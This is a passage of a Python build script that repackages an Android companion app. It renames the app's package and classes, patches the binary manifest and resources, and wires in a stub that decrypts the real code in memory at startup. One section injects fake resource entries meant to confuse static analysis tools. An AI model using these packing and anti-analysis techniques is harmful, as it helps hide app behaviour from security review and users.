        cs = struct.unpack_from('<I', data, pos + 4)[0]
        if cs == 0 or cs > end - pos:
            break

        if ct == 0x0201:  # TABLE_TYPE — check language
            config_size = struct.unpack_from('<I', data, pos + 20)[0]
            if pos + 20 + config_size <= total and config_size >= 10:
                lang_bytes = bytes(data[pos + 28: pos + 30]).rstrip(b'\x00')
            else:
                lang_bytes = b''
            if lang_bytes in KEEP_LANGS:
                kept += data[pos: pos + cs]
            else:
                stripped_count += 1
                stripped_bytes += cs
        else:
            kept += data[pos: pos + cs]

        pos += cs

    if stripped_count == 0:
        return arsc_data  # nothing to strip

    # Rebuild: table header + global string pool + package header + kept interior
    pkg_header = bytes(data[pkg_start: pkg_start + pkg_hdr_size])
    new_pkg    = bytearray(pkg_header) + kept

    # Update package chunk size field
    struct.pack_into('<I', new_pkg, 4, len(new_pkg))

    # Reassemble full arsc
    prefix   = bytes(data[:pkg_start])   # table header + global string pool
    new_arsc = bytearray(prefix) + new_pkg

    # Update table chunk size
    struct.pack_into('<I', new_arsc, 4, len(new_arsc))

    print(f"  arsc language strip: removed {stripped_count} locale chunks "
          f"({stripped_bytes//1024}KB) — kept English + Indian languages")
    return bytes(new_arsc)


def rebuild_arsc_string_pool(arsc_data, full_path_rename_map):
    data = bytearray(arsc_data)
    tbl_hdr_size  = struct.unpack_from("<H", data, 2)[0]
    SP            = tbl_hdr_size
    sp_hdr_size   = struct.unpack_from("<H", data, SP + 2)[0]
    sp_chunk_size = struct.unpack_from("<I", data, SP + 4)[0]
    str_count     = struct.unpack_from("<I", data, SP + 8)[0]
    style_count   = struct.unpack_from("<I", data, SP + 12)[0]
    flags         = struct.unpack_from("<I", data, SP + 16)[0]
    strings_start = struct.unpack_from("<I", data, SP + 20)[0]
    styles_start  = struct.unpack_from("<I", data, SP + 24)[0]

    str_data_base = SP + strings_start
    strings = []
    scrubbed = 0
    pos = str_data_base
    for _ in range(str_count):
        s, size = _read_utf8_str(data, pos)
        # Apply path rename map first
        s = full_path_rename_map.get(s, s)
        # Scrub AppCompat/androidx strings → blank
        if _is_appcompat_arsc_string(s):
            s = ""
            scrubbed += 1
        strings.append(s)
        pos += size
    if scrubbed > 0:
        print(f"  arsc string pool: scrubbed {scrubbed} AppCompat strings → blank")

    new_offsets  = []
    new_str_data = bytearray()
    for s in strings:
        new_offsets.append(len(new_str_data))
        new_str_data += _encode_utf8_str(s)

    # Drop style data entirely — AppCompat styles are safe to remove.
    # Style spans are only used for rich text rendering in AppCompat widgets.
    # Companion has no AppCompat UI — dropping styles is safe and reduces
    # arsc size significantly (style data is often 50-200KB of the total).
    style_data   = b''
    new_style_count = 0
    new_styles_start = 0

    new_offsets_bytes = b''.join(struct.pack("<I", o) for o in new_offsets)
    new_strings_start = sp_hdr_size + len(new_offsets_bytes)
    new_sp_chunk_size = sp_hdr_size + len(new_offsets_bytes) + len(new_str_data)

    new_sp_hdr = bytearray(sp_hdr_size)
    struct.pack_into("<H", new_sp_hdr, 0,  0x0001)
    struct.pack_into("<H", new_sp_hdr, 2,  sp_hdr_size)
    struct.pack_into("<I", new_sp_hdr, 4,  new_sp_chunk_size)
    struct.pack_into("<I", new_sp_hdr, 8,  str_count)
    struct.pack_into("<I", new_sp_hdr, 12, new_style_count)   # styles → 0
    struct.pack_into("<I", new_sp_hdr, 16, flags)
    struct.pack_into("<I", new_sp_hdr, 20, new_strings_start)
    struct.pack_into("<I", new_sp_hdr, 24, new_styles_start)  # styles offset → 0

    new_sp_chunk = bytearray(bytes(new_sp_hdr) + new_offsets_bytes + bytes(new_str_data))
    while len(new_sp_chunk) % 4 != 0:
        new_sp_chunk += b'\x00'
    struct.pack_into("<I", new_sp_chunk, 4, len(new_sp_chunk))

    rest = bytes(data[SP + sp_chunk_size:])
    new_arsc = bytearray(data[:tbl_hdr_size])
    final = bytearray(bytes(new_arsc) + bytes(new_sp_chunk) + rest)
    while len(final) % 4 != 0:
        final += b'\x00'
    struct.pack_into("<I", final, 4, len(final))
    return bytes(final)


def _patch_axml_version(manifest_raw: bytes, ver_code: int, ver_name: str) -> bytes:
    import struct as _struct
    data = bytearray(manifest_raw)
    SP = 8
    if len(data) < SP + 28:
        return bytes(data)

    sp_hdr_size   = _struct.unpack_from('<H', data, SP + 2)[0]
    sp_chunk_size = _struct.unpack_from('<I', data, SP + 4)[0]
    str_count     = _struct.unpack_from('<I', data, SP + 8)[0]
    flags         = _struct.unpack_from('<I', data, SP + 16)[0]
    strings_start = _struct.unpack_from('<I', data, SP + 20)[0]
    is_utf8       = bool(flags & (1 << 8))
    str_data_base = SP + strings_start
    offsets_base  = SP + sp_hdr_size

    VER_CODE_REF = 0x0101021B
    xml_tree_off = SP + sp_chunk_size
    i = xml_tree_off
    patched_code = False
    while i < len(data) - 20:
        val = _struct.unpack_from('<I', data, i)[0]
        if val == VER_CODE_REF:
            if i + 20 <= len(data):
                _struct.pack_into('<I', data, i + 16, ver_code & 0xFFFFFFFF)
                patched_code = True
            break
        i += 1

    if patched_code:
        print(f"  [Step 9A] versionCode patched → {ver_code}")
    else:
        print(f"  [Step 9A] ⚠️  versionCode attribute not found — skipping")

    if not is_utf8:
        return bytes(data)

    offsets = [
        _struct.unpack_from('<I', data, offsets_base + k * 4)[0]
        for k in range(str_count)
    ]

    def read_utf8(pos):
        b0 = data[pos]; pos += 1
        if b0 & 0x80: pos += 1
        b1 = data[pos]; pos += 1
        bl = ((b1 & 0x7F) << 8) | data[pos] if b1 & 0x80 else b1
        if b1 & 0x80: pos += 1
        return data[pos:pos + bl].decode('utf-8', errors='replace')

    def encode_utf8_str(s):
        enc = s.encode('utf-8')
        cl, bl = len(s), len(enc)
        hdr  = bytes([(cl >> 8) | 0x80, cl & 0xFF]) if cl > 0x7F else bytes([cl])
        hdr += bytes([(bl >> 8) | 0x80, bl & 0xFF]) if bl > 0x7F else bytes([bl])
        return hdr + enc + b'\x00'

    strings = []
    for off in offsets:
        pos = str_data_base + off
        if pos >= len(data):
            strings.append('')
            continue
        strings.append(read_utf8(pos))

    import re as _re
    ver_pattern = _re.compile(r'^\d+\.\d+')
    replaced_name = False
    for idx, s in enumerate(strings):
        if ver_pattern.match(s) and len(s) < 20:
            strings[idx] = ver_name
            replaced_name = True
            break

    if not replaced_name:
        print(f"  [Step 9A] ⚠️  versionName string not found — skipping")
        return bytes(data)

    new_str_data  = bytearray()
    new_offsets   = []
    for s in strings:
        new_offsets.append(len(new_str_data))
        new_str_data.extend(encode_utf8_str(s))

    style_count   = _struct.unpack_from('<I', data, SP + 12)[0]
    styles_start  = _struct.unpack_from('<I', data, SP + 24)[0]
    style_data    = b''
    if style_count > 0 and styles_start > 0:
        style_data = bytes(data[SP + styles_start: SP + sp_chunk_size])

    new_offsets_bytes = b''.join(_struct.pack('<I', o) for o in new_offsets)
    new_strings_start = sp_hdr_size + len(new_offsets_bytes)
    new_styles_start  = (new_strings_start + len(new_str_data)) if style_count > 0 else 0
    new_sp_size       = sp_hdr_size + len(new_offsets_bytes) + len(new_str_data) + len(style_data)

    new_sp_hdr = bytearray(sp_hdr_size)
    _struct.pack_into('<H', new_sp_hdr,  0, 0x0001)
    _struct.pack_into('<H', new_sp_hdr,  2, sp_hdr_size)
    _struct.pack_into('<I', new_sp_hdr,  4, new_sp_size)
    _struct.pack_into('<I', new_sp_hdr,  8, str_count)
    _struct.pack_into('<I', new_sp_hdr, 12, style_count)
    _struct.pack_into('<I', new_sp_hdr, 16, flags)
    _struct.pack_into('<I', new_sp_hdr, 20, new_strings_start)
    _struct.pack_into('<I', new_sp_hdr, 24, new_styles_start)

    while len(new_str_data) % 4 != 0:
        new_str_data += b'\x00'

    new_sp_size = sp_hdr_size + len(new_offsets_bytes) + len(new_str_data) + len(style_data)
    new_sp_hdr_final = bytearray(new_sp_hdr)
    _struct.pack_into('<I', new_sp_hdr_final, 4, new_sp_size)

    new_sp   = bytes(new_sp_hdr_final) + new_offsets_bytes + bytes(new_str_data) + style_data
    rest     = bytes(data[SP + sp_chunk_size:])
    result   = bytearray(data[:8])
    result.extend(new_sp)
    result.extend(rest)
    while len(result) % 4 != 0:
        result.extend(b'\x00')
    _struct.pack_into('<I', result, 4, len(result))

    print(f"  [Step 9A] versionName patched → {ver_name} (size={len(result)})")
    return bytes(result)


def _inject_axml_app_name(manifest_raw: bytes, new_pkg: str) -> bytes:
    """
    Inject android:name="<new_pkg>.App" attribute into the <application>
    START_ELEMENT in a binary AXML manifest.

    The raw companion APK has NO android:name on <application> — the App class
    is never called by Android as an Application subclass.  Our PHASE_3 stub
    lives in App.attachBaseContext(), so Android must know to instantiate App.

    Strategy (safe, no string-pool surgery):
      1. Build string value ".<pkg>.App" (simple-name form: ".<SimpleName>")
         Actually: use the fully-qualified form new_pkg + ".App" for safety.
      2. Append two new UTF-8 strings to the existing string pool:
           - "name"          (attribute name)
           - "<new_pkg>.App" (attribute value)
      3. Update string pool offsets table + sp_size + file total size.
      4. Append one 20-byte attribute record to the <application>
         START_ELEMENT (attr_count += 1, chunk_size += 20).

    Binary AXML attribute record layout (20 bytes each):
      [0..3]  ns_idx  (int32)  — namespace string index; 0xFFFFFFFF for android:
                                  Actually Android ns is always index in pool;
                                  we use the same ns_idx as existing attrs.
      [4..7]  name_idx (int32) — string index of "name"
      [8..11] raw_val  (int32) — raw string index of value (-1 if typed)
      [12..15] reserved (int32) 0x00080000 (size=8, res=0)
      [16]    data_type (uint8) 0x03 = TYPE_STRING
      [17..19] padding (3 bytes) 0x00
      But actual layout in Android binary AXML is 20 bytes:
        offset 0:  ns_idx    (int32LE)
        offset 4:  name_idx  (int32LE)
        offset 8:  raw_val   (int32LE)  — string pool index for raw value
        offset 12: value_size (uint16LE) = 8
        offset 14: res0      (uint8)    = 0
        offset 15: data_type (uint8)    = 0x03 (TYPE_STRING)
        offset 16: data      (int32LE)  — string pool index for typed value

    android: namespace URI = "http://schemas.android.com/apk/res/android"
    We reuse the ns_idx from the first existing attribute of <application>.
    """
    axml = bytearray(manifest_raw)
    SP = 8
    sp_size     = struct.unpack_from("<I", axml, SP + 4)[0]
    str_count   = struct.unpack_from("<I", axml, SP + 8)[0]
    flags       = struct.unpack_from("<I", axml, SP + 16)[0]
    is_utf8     = bool(flags & (1 << 8))
    str_start   = struct.unpack_from("<I", axml, SP + 20)[0]
    offsets_abs = SP + 28

    if not is_utf8:
        print("  [inject_app_name] ⚠️  manifest is UTF-16 encoded — injection not supported, skipping")
        return manifest_raw

    # Build string table: index → string value + byte offset within str_data
    strings   = {}
    str_bytes = {}  # index → byte start within str_data section
    str_data_start = SP + str_start
    for i in range(str_count):
        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
        p   = str_data_start + off
        str_bytes[i] = p
        try:
            cl = axml[p]; p += 1
            if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
            bl = axml[p]; p += 1
            if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
            s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
            strings[i] = s
        except Exception:
            strings[i] = ""

    # Check if android:name already exists on <application>
    sp_end   = SP + sp_size
    tree_pos = sp_end
    while tree_pos < len(axml) - 8:
        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
        if csize == 0:
            break
        if ctype == 0x0102:
            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
            if strings.get(name_idx) == "application":
                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
                for a in range(attr_count):
                    aoff      = tree_pos + attr_start + a * attr_size
                    n2        = struct.unpack_from("<i", axml, aoff + 4)[0]
                    if strings.get(n2) == "name":
                        print("  [inject_app_name] ⚠️  android:name already present on <application> — skipping")
                        return manifest_raw
                break
        tree_pos += csize

    # ── Append two new UTF-8 strings to string pool ───────────────────────────
    # Find end of existing string data (= start of str_data + sp_size - 28 - str_count*4)
    # More reliably: str_data ends at sp_end
    existing_str_data_end = sp_end  # absolute position
    existing_str_data_len = sp_end - str_data_start

    app_class_value = new_pkg + ".App"
    attr_name_str   = "name"

    def _utf8_axml_entry(s: str) -> bytes:
        """Encode a string as AXML UTF-8 string entry: [char_len][byte_len][utf8_bytes][NUL]"""
        enc = s.encode("utf-8")
        cl  = len(s)
        bl  = len(enc)
        hdr = bytearray()
        if cl > 127:
            hdr.append((cl >> 8) | 0x80); hdr.append(cl & 0xFF)
        else:
            hdr.append(cl)
        if bl > 127:
            hdr.append((bl >> 8) | 0x80); hdr.append(bl & 0xFF)
        else:
            hdr.append(bl)
        return bytes(hdr) + enc + b'\x00'

    name_entry  = _utf8_axml_entry(attr_name_str)
    value_entry = _utf8_axml_entry(app_class_value)

    # New string indices
    idx_name  = str_count          # "name"
    idx_value = str_count + 1      # "<pkg>.App"

    # New offsets for the two new strings (relative to str_data start)
    off_name  = existing_str_data_len
    off_value = existing_str_data_len + len(name_entry)

    # ── Rebuild the full AXML with new strings + attribute ────────────────────
    # We must insert:
    #   a) Two new offset entries in the offsets table (+8 bytes)
    #   b) Two new string entries at end of str_data (+len(name_entry)+len(value_entry))
    #   c) One new attribute entry at end of <application>'s attr list (+20 bytes)
    #   d) Update sp_size, str_count, file total size, chunk sizes

    # Step 1: identify byte ranges
    #   offsets table: [offsets_abs .. offsets_abs + str_count*4)
    #   str_data:      [str_data_start .. sp_end)
    #   xml tree:      [sp_end .. end)

    offsets_table_end = offsets_abs + str_count * 4  # = str_data_start

    # Build new offsets table (original + two new entries)
    new_offsets_bytes = bytearray(axml[offsets_abs:offsets_table_end])
    new_offsets_bytes += struct.pack("<I", off_name)
    new_offsets_bytes += struct.pack("<I", off_value)

    # Build new str_data (original + two new entries)
    old_str_data = axml[str_data_start:sp_end]
    new_str_data = old_str_data + name_entry + value_entry
    # Pad to 4-byte alignment
    while len(new_str_data) % 4 != 0:
        new_str_data += b'\x00'

    # New sp_size: header(28) + offsets((str_count+2)*4) + str_data
    new_str_count = str_count + 2
    new_sp_size   = 28 + new_str_count * 4 + len(new_str_data)

    # ── Rebuild up to xml tree ─────────────────────────────────────────────────
    part_before_offsets = bytes(axml[0:offsets_abs])
    new_axml = bytearray(part_before_offsets)
    new_axml += bytes(new_offsets_bytes)
    new_axml += bytes(new_str_data)
    # xml_tree starts at sp_end in original; new xml_tree starts right here
    xml_tree = bytes(axml[sp_end:])
    new_axml += xml_tree

    # ── Patch sp header: str_count and sp_size ────────────────────────────────
    struct.pack_into("<I", new_axml, SP + 4, new_sp_size)   # sp_size
    struct.pack_into("<I", new_axml, SP + 8, new_str_count) # str_count

    # ── Find <application> START_ELEMENT in new xml_tree and inject attr ──────
    new_sp_end  = SP + new_sp_size
    tree_start  = new_sp_end
    tree_cursor = tree_start
    injected    = False

    while tree_cursor < len(new_axml) - 8:
        ctype = struct.unpack_from("<H", new_axml, tree_cursor)[0]
        csize = struct.unpack_from("<I", new_axml, tree_cursor + 4)[0]
        if csize == 0:
            break
        if ctype == 0x0102:  # START_ELEMENT
            # name_idx is now offset by 0 since strings before our injection
            # are all at the same indices; new strings are at end
            name_idx = struct.unpack_from("<i", new_axml, tree_cursor + 20)[0]
            # re-read string: original strings unchanged
            elem_name = strings.get(name_idx, "")
            if elem_name == "application":
                attr_start_h = struct.unpack_from("<H", new_axml, tree_cursor + 24)[0]
                attr_size_h  = struct.unpack_from("<H", new_axml, tree_cursor + 26)[0]
                attr_count_h = struct.unpack_from("<H", new_axml, tree_cursor + 28)[0]

                # Get ns_idx from first existing attribute (reuse android: namespace)
                ns_idx = -1
                if attr_count_h > 0:
                    first_attr_off = tree_cursor + attr_start_h
                    ns_idx = struct.unpack_from("<i", new_axml, first_attr_off)[0]

                # Build new attribute record (20 bytes)
                new_attr = bytearray(20)
                struct.pack_into("<i", new_attr, 0,  ns_idx)    # namespace
                struct.pack_into("<i", new_attr, 4,  idx_name)  # "name" string index
                struct.pack_into("<i", new_attr, 8,  idx_value) # raw_val = value string index
                struct.pack_into("<H", new_attr, 12, 8)         # value_size = 8
                new_attr[14] = 0x00                             # res0
                new_attr[15] = 0x03                             # TYPE_STRING
                struct.pack_into("<i", new_attr, 16, idx_value) # typed value = value string index

                # Insert attribute at end of this element's attr list
                insert_pos = tree_cursor + attr_start_h + attr_count_h * attr_size_h
                new_axml = new_axml[:insert_pos] + bytearray(new_attr) + new_axml[insert_pos:]

                # Patch attr_count + chunk_size
                struct.pack_into("<H", new_axml, tree_cursor + 28, attr_count_h + 1)
                struct.pack_into("<I", new_axml, tree_cursor + 4,  csize + 20)
                injected = True
                break
        tree_cursor += csize

    if not injected:
        print("  [inject_app_name] ⚠️  <application> element not found in manifest — skipping")
        return manifest_raw

    # ── Update total AXML file size ───────────────────────────────────────────
    struct.pack_into("<I", new_axml, 4, len(new_axml))
    print(f"  [inject_app_name] ✅ android:name=\"{app_class_value}\" injected into <application>")
    return bytes(new_axml)


def _strip_axml_provider(manifest_raw: bytes, provider_class_name: str) -> bytes:
    """
    Remove a <provider> element from a binary AXML manifest by class name.

    The companion manifest declares androidx.startup.InitializationProvider
    as a ContentProvider. Android's ActivityThread calls installContentProviders()
    BEFORE attachBaseContext() runs — before our InMemoryDexClassLoader is set up.
    The real DEX is not loaded yet → ClassNotFoundException → crash.

    Fix: remove the <provider> START_ELEMENT + END_ELEMENT chunks from the XML
    tree section. The string pool is untouched (unused strings are harmless).
    Update the AXML file size field at offset 4.
    """
    axml = bytearray(manifest_raw)
    SP = 8
    sp_size     = struct.unpack_from("<I", axml, SP + 4)[0]
    str_count   = struct.unpack_from("<I", axml, SP + 8)[0]
    flags       = struct.unpack_from("<I", axml, SP + 16)[0]
    is_utf8     = bool(flags & (1 << 8))
    str_start   = struct.unpack_from("<I", axml, SP + 20)[0]
    offsets_abs = SP + 28

    # Build string table
    strings = {}
    for i in range(str_count):
        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
        p   = SP + str_start + off
        try:
            if is_utf8:
                cl = axml[p]; p += 1
                if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
                bl = axml[p]; p += 1
                if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
                s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
            else:
                cl = struct.unpack_from("<H", axml, p)[0]; p += 2
                s  = bytes(axml[p:p + cl * 2]).decode("utf-16-le", "replace")
            strings[i] = s
        except Exception:
            strings[i] = ""

    sp_end   = SP + sp_size
    tree_pos = sp_end

    remove_start = -1
    remove_end   = -1

    while tree_pos < len(axml) - 8:
        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
        if csize == 0:
            break
        if ctype == 0x0102:  # START_ELEMENT
            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
            if strings.get(name_idx) == "provider":
                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
                for a in range(attr_count):
                    aoff    = tree_pos + attr_start + a * attr_size
                    n2      = struct.unpack_from("<i", axml, aoff + 4)[0]
                    raw_val = struct.unpack_from("<i", axml, aoff + 8)[0]
                    vt      = axml[aoff + 15]
                    vd      = struct.unpack_from("<i", axml, aoff + 16)[0]
                    # android:name value: type 0x03 = string ref in vd,
                    # type 0x00 = raw string ref in raw_val
                    val_idx = vd if vt == 0x03 else (raw_val if vt == 0x00 else -1)
                    val_str = strings.get(val_idx, "")
                    attr_name = strings.get(n2, "")
                    # Match by value string or by attribute raw bytes
                    if provider_class_name in val_str or provider_class_name in attr_name:
                        remove_start = tree_pos
                        # Find matching END_ELEMENT (provider)
                        ep = tree_pos + csize
                        while ep < len(axml) - 8:
                            et = struct.unpack_from("<H", axml, ep)[0]
                            es = struct.unpack_from("<I", axml, ep + 4)[0]
                            if et == 0x0103:  # END_ELEMENT
                                en = struct.unpack_from("<i", axml, ep + 20)[0]
                                if strings.get(en) == "provider":
                                    remove_end = ep + es
                                    break
                            ep += es if es > 0 else 1
                        break
        tree_pos += csize

    if remove_start == -1 or remove_end == -1:
        print(f"  [strip_provider] ⚠️  {provider_class_name} not found in manifest — no change")
        return manifest_raw

    # Remove the bytes and update file size
    new_axml = axml[:remove_start] + axml[remove_end:]
    struct.pack_into("<I", new_axml, 4, len(new_axml))
    removed = remove_end - remove_start
    print(f"  [strip_provider] ✅ Removed {provider_class_name} ({removed} bytes) from manifest")
    return bytes(new_axml)


def _strip_axml_app_component_factory(manifest_raw: bytes) -> bytes:
    """
    Remove the android:appComponentFactory attribute from the <application>
    element in a binary AXML manifest.

    The companion APK declares:
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
    Android reads this BEFORE attachBaseContext() runs and tries to load
    CoreComponentFactory using the stub DEX classloader — which doesn't have it.
    Result: ClassNotFoundException → crash before stub can decrypt real DEX.

    Fix: zero out the appComponentFactory attribute value in the application
    START_ELEMENT so Android falls back to default component instantiation.
    The stub's Phase 6 patches LoadedApk.mClassLoader — after that all
    component creation goes through the IMDCL which has the real DEX.
    """
    axml = bytearray(manifest_raw)
    SP = 8
    sp_size     = struct.unpack_from("<I", axml, SP + 4)[0]
    str_count   = struct.unpack_from("<I", axml, SP + 8)[0]
    flags       = struct.unpack_from("<I", axml, SP + 16)[0]
    is_utf8     = bool(flags & (1 << 8))
    str_start   = struct.unpack_from("<I", axml, SP + 20)[0]
    offsets_abs = SP + 28

    # Build string table
    strings = {}
    for i in range(str_count):
        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
        p   = SP + str_start + off
        try:
            if is_utf8:
                cl = axml[p]; p += 1
                if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
                bl = axml[p]; p += 1
                if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
                s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
            else:
                cl = struct.unpack_from("<H", axml, p)[0]; p += 2
                s  = bytes(axml[p:p + cl * 2]).decode("utf-16-le", "replace")
            strings[i] = s
        except Exception:
            strings[i] = ""

    sp_end   = SP + sp_size
    tree_pos = sp_end

    while tree_pos < len(axml) - 8:
        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
        if csize == 0:
            break
        if ctype == 0x0102:  # START_ELEMENT
            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
            if strings.get(name_idx) == "application":
                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
                for a in range(attr_count):
                    aoff     = tree_pos + attr_start + a * attr_size
                    n2       = struct.unpack_from("<i", axml, aoff + 4)[0]
                    attr_name = strings.get(n2, "")
                    if attr_name == "appComponentFactory":
                        # Zero out the value: set raw_val and vd to -1 (no value)
                        # and set type to 0x00 (null) so Android ignores it
                        struct.pack_into("<i", axml, aoff + 8,  -1)  # raw_val
                        axml[aoff + 15] = 0x00                        # data type = null
                        struct.pack_into("<i", axml, aoff + 16, 0)   # data value = 0
                        print("  [strip_appComponentFactory] ✅ Removed appComponentFactory from manifest")
                        return bytes(axml)
                break  # found <application> but no appComponentFactory attr
        tree_pos += csize

    print("  [strip_appComponentFactory] ⚠️  appComponentFactory not found — no change")
    return manifest_raw


def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                            class_rename_map=None,
                            p3_key_bytes=None, p3_enc_asset=None):
    print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")

    OLD = OLD_PKG.encode()
    NEW = new_pkg.encode()
    DELTA = len(NEW) - len(OLD)

    with zipfile.ZipFile(MOD_ASSET, "r") as z:
        manifest_raw = z.read("AndroidManifest.xml")

    SP           = 8
    sp_size      = struct.unpack_from("<I", manifest_raw, SP + 4)[0]
    str_count    = struct.unpack_from("<I", manifest_raw, SP + 8)[0]
    strs_start   = struct.unpack_from("<I", manifest_raw, SP + 20)[0]
    str_data_abs = SP + strs_start
    offsets_abs  = SP + 28
    sp_end       = SP + sp_size
    xml_tree     = manifest_raw[sp_end:]

    entries = []
    for i in range(str_count):
        off = struct.unpack_from("<I", manifest_raw, offsets_abs + i * 4)[0]
        pos = str_data_abs + off
        cc  = manifest_raw[pos]
        bc  = manifest_raw[pos + 1]
        ch  = manifest_raw[pos + 2:pos + 2 + bc]
        entries.append((cc, bc, ch))

    new_str_data = bytearray()
    new_offsets  = []
    replaced = 0

    for (cc, bc, ch) in entries:
        new_offsets.append(len(new_str_data))
        if OLD in ch:
            new_ch = ch.replace(OLD, NEW)
            new_str_data.extend([cc + DELTA, bc + DELTA])
            new_str_data.extend(new_ch)
            new_str_data.append(0)
            replaced += 1
        else:
            new_str_data.extend([cc, bc])
            new_str_data.extend(ch)
            new_str_data.append(0)

    if replaced == 0:
        print("[X] No strings replaced in manifest (package name)")
        sys.exit(1)
    print(f"  Manifest: {replaced} pkg replacements")

    if class_rename_map:
        class_replaced = 0
        new_str_data2 = bytearray()
        new_offsets2  = []
        pos2 = 0
        temp = bytes(new_str_data)
        while pos2 < len(temp):
            if pos2 + 2 > len(temp): break
            cc2 = temp[pos2]; bc2 = temp[pos2+1]
            if pos2 + 2 + bc2 + 1 > len(temp): break
            ch2 = temp[pos2+2:pos2+2+bc2]
            new_offsets2.append(len(new_str_data2))
            try:
                s = ch2.decode("utf-8")
            except Exception:
                new_str_data2.extend([cc2, bc2]); new_str_data2.extend(ch2); new_str_data2.append(0)
                pos2 += 2 + bc2 + 1; continue

            replaced_class = False
            for orig_class, new_class in class_rename_map.items():
                base_orig = orig_class.split("$")[0]
                base_new  = new_class.split("$")[0]
                if s == new_pkg + "." + base_orig:
                    full_new = new_pkg + "." + base_new
                    enc = full_new.encode("utf-8")
                    cl  = len(full_new); bl = len(enc)
                    new_str_data2.append(cl if cl <= 127 else ((cl>>8)|0x80))
                    if cl > 127: new_str_data2.append(cl&0xFF)
                    new_str_data2.append(bl if bl <= 127 else ((bl>>8)|0x80))
                    if bl > 127: new_str_data2.append(bl&0xFF)
                    new_str_data2.extend(enc); new_str_data2.append(0)
                    class_replaced += 1; replaced_class = True; break

            if not replaced_class:
                new_str_data2.extend([cc2, bc2]); new_str_data2.extend(ch2); new_str_data2.append(0)
            pos2 += 2 + bc2 + 1

        if class_replaced > 0:
            new_str_data = new_str_data2
            new_offsets  = new_offsets2
            print(f"  Manifest: {class_replaced} class name(s) updated")

    while len(new_str_data) % 4 != 0:
        new_str_data.append(0)

    new_sp_size = 28 + str_count * 4 + len(new_str_data)
    assert new_sp_size % 4 == 0, f"SP chunk not aligned: {new_sp_size}"
    result = bytearray()
    result.extend(manifest_raw[0:8])
    result.extend(manifest_raw[SP:SP + 28])
    for off in new_offsets:
        result.extend(struct.pack("<I", off))
    result.extend(new_str_data)
    result.extend(xml_tree)
    while len(result) % 4 != 0:
        result.extend(b'\x00')
    struct.pack_into("<I", result, 4,      len(result))
    struct.pack_into("<I", result, SP + 4, new_sp_size)
    new_manifest = bytes(result)

    # Strip androidx.startup.InitializationProvider from manifest.
    # This ContentProvider is declared in the original companion manifest but
    # its class lives in the encrypted DEX. Android calls installContentProviders()
    # BEFORE attachBaseContext() — before our stub loader has a chance to set up
    # InMemoryDexClassLoader. Result: ClassNotFoundException → crash.
    # Removing the <provider> declaration from the manifest prevents Android from
    # trying to instantiate it during startup. The class still exists in the
    # encrypted DEX and works fine once loaded — it just doesn't need to be
    # auto-initialized via ContentProvider mechanism.
    new_manifest = _strip_axml_provider(
        new_manifest, "InitializationProvider"
    )

    # Strip appComponentFactory from <application> element.
    # androidx.core.app.CoreComponentFactory lives in the encrypted DEX.
    # Android resolves this attribute BEFORE attachBaseContext() runs,
    # using the stub classloader which doesn't have the class → crash.
    new_manifest = _strip_axml_app_component_factory(new_manifest)

    if meta:
        new_manifest = _patch_axml_version(
            new_manifest,
            int(meta["ver_code"]),
            meta["ver_name"]
        )

    with zipfile.ZipFile(MOD_ASSET, "r") as z:
        arsc_raw = bytearray(z.read("resources.arsc"))

    OLD_UTF16 = OLD.decode("ascii").encode("utf-16-le") + b"\x00\x00"
    NEW_UTF16 = NEW.decode("ascii").encode("utf-16-le") + b"\x00\x00"

    arsc_patched = 0
    pos = 0
    while pos < len(arsc_raw) - 8:
        chunk_type = struct.unpack_from("<H", arsc_raw, pos)[0]
        hdr_size   = struct.unpack_from("<H", arsc_raw, pos + 2)[0]
        chunk_size = struct.unpack_from("<I", arsc_raw, pos + 4)[0]
        if chunk_type == 0x0200 and hdr_size == 288 and 1000 < chunk_size < len(arsc_raw):
            name_off   = pos + 12
            name_field = arsc_raw[name_off:name_off + 256]
            if OLD_UTF16 in name_field:
                new_name_field = bytearray(256)
                new_name_field[:len(NEW_UTF16)] = NEW_UTF16
                arsc_raw[name_off:name_off + 256] = new_name_field
                arsc_patched += 1
        pos += 1

    if arsc_patched == 0:
        print("[X] Old package name not found in resources.arsc")
        sys.exit(1)

    new_arsc = rebuild_arsc_string_pool(arsc_raw, res_rename)
    print(f"  Rebuilt arsc string pool: {len(res_rename)} paths updated")

    # ── W10: Inject fake resource entries into arsc string pool ──────────────
    # Adds random fake string entries to the global arsc string pool.
    # These confuse static arsc parsers and resource analysis tools.
    # The entries reference non-existent resource IDs — Android ignores them.
    # Applied before rebuild_arsc_string_pool so they're included in the rebuild.
    try:
        _fake_res_names = [
            f"res/raw/{secrets.token_hex(4)}.bin",
